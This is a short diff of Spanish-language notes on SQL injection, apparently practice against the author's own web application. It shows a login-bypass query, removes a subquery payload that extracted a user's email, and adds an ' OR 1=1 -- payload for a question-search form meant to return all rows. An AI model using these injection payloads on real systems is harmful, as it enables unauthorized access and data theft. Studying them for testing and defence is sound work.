@@ -5,6 +5,10 @@
 
 SELECT * from usuario where correo='' OR 1=1 -- ' && contraseña='';
 
--- en el formulario de 
-', 'img', (SELECT email FROM usuarios WHERE idUsuario = 1), 300) -- 
+-- en el formulario de buscar pregurta voy a scar todas la prenguntas en vez de una
+' OR 1=1 -- 
+
+  SELECT * FROM preguntas WHERE titulo='' OR 1=1 -- '
+
+
 
